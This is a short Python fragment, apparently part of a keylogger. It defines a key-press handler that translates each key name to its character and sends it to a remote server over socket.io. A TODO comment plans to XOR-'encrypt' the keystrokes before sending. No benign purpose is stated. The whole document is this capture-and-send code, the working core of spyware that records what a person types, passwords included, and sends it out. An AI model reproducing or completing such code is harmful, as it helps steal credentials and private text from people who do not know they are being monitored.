
translate_key = {'space': ' ', 'enter': '\n', 'tab': '\t', 'caps lock': ''}

def on_key(e, sio):
    """ Handle key press event and send to server via socket.io.
    """
    key_value = translate_key.get(e.name, e.name) # get the actual key value

    # TODO(encrypt): encrypt the key_value with XOR before sending
    sio.emit('ev', {'ev': key_value})
